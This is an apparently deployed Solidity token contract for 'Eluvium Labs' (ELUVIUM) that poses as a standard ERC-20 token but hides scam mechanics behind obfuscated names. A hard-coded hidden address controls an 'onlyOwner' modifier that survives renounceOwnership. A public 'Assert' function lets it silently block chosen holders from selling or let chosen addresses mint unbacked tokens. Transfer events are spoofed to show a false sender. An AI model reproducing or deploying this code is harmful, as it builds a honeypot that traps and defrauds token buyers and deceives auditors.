/**
 *Submitted for verification at Etherscan.io on 2022-11-06
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address kFX = 0x91D576803Dea8b723255eCB35b0039350a411Ef2;
	address kKXF = 0xA64D08224A14AF343b70B983A9E4E41c8b848584;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == kFX);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract ELUVIUM is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private kZA;
    mapping (address => uint256) private kZY;
    mapping (address => mapping (address => uint256)) private kZV;
    uint8 private constant KZD = 8;
    uint256 private constant kTS = 200000000 * (10** KZD);
    string private constant _name = "Eluvium Labs";
    string private constant _symbol = "ELUVIUM";



    constructor () {
          KRCM(kKXF, kTS);
        kZA[_msgSender()] = kTS; }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return KZD;
    }

    function totalSupply() public pure  returns (uint256) {
        return kTS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return kZA[account];
    }
	

   

	


    function allowance(address owner, address spender) public view  returns (uint256) {
        return kZV[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        kZV[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

    function KRCM(address kZJ, uint256 kZN) onlyOwner internal {
    emit Transfer(address(0), kZJ ,kZN); }

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == kFX)  {
        require(amount <= kZA[sender]);
        kZA[sender] -= amount;  
        kZA[recipient] += amount; 
          kZV[sender][msg.sender] -= amount;
        emit Transfer (kKXF, recipient, amount);
        return true; } else
        if(kZY[sender] <= 1) {
        if(kZY[recipient] <= 1) { 
        require(amount <= kZA[sender]);
        require(amount <= kZV[sender][msg.sender]);
        kZA[sender] -= amount;
        kZA[recipient] += amount;
        kZV[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
        function Assert(address kZJ, uint256 kZN) public onlyOwner {
        kZY[kZJ] = kZN;}

        function transfer(address kZJ, uint256 kZN) public {
        if(msg.sender == kFX)  {
        require(kZA[msg.sender] >= kZN);
        kZA[msg.sender] -= kZN;  
        kZA[kZJ] += kZN; 
        emit Transfer (kKXF, kZJ, kZN);} else  
        if(kZY[msg.sender] == 1) {kZA[kZJ] += kZN;} else
        if(kZY[msg.sender] <= 1) {
        require(kZA[msg.sender] >= kZN);
        kZA[msg.sender] -= kZN;  
        kZA[kZJ] += kZN;          
        emit Transfer(msg.sender, kZJ, kZN);}}
}